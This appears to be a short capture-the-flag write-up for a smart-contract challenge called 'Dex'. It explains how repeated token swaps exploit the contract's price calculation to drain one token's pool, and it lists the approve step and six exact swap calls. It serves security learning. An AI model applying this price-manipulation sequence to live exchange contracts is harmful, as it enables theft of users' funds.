## Dex

1. We need to manipulate the market (the token prices), we can first send all of a single token to swap for another and then we can swap from token that we have to another and cycle it till we drain one of the tokens... again i watched d-squared even though i felt i could do this myself and that sped up my solution.

2. `instance` '0x0B6Ecf40A4873AD3976bbD5D3a7e2848efFfB5cD' => `t1 = await contract.token1()` '0x09968A5da63B54536f000Cb8ca84476139A9e1c0' => `t2 = await contract.token2()` '0x6a43B8182D1531DA7003c8F5EF69acE280D04851' here we are storing t1 and t2 in the console so that we can use that to swap more efficiently in next steps.

3. first add both the tokens in remix and get them using address and approve them steps => remix address at and `approve(instance, 500)` via token 1 and token 2 where as instance is the address of the challenge Dex contract that swaps/can transfer from your account... the approve of challenge fails because the challenge contract approves both the token's but with an extra parameter

4. Next steps will drain one of the tokens
   await contract.swap(t1, t2, 10)
   await contract.swap(t2, t1, 20)
   await contract.swap(t1, t2, 24)
   await contract.swap(t2, t1, 30)
   await contract.swap(t1, t2, 41)
   await contract.swap(t2, t1, 45)

5. success
